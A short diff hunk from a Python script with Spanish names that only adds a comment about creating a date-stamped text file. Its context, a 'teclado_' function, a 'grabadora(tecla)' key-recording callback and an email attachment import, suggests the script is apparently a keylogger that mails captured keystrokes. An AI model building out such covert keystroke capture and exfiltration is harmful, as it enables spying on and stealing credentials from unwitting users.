@@ -8,7 +8,7 @@ from email.mime.base import MIMEBase
 def teclado_():
   
     fecha= datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-    nombre_archivo = 'Cadena_{}.txt'.format(fecha)
+    nombre_archivo = 'Cadena_{}.txt'.format(fecha)  # se crea un archivo txt con la fecha actual
     t0=time.time()
     
     def grabadora(tecla):
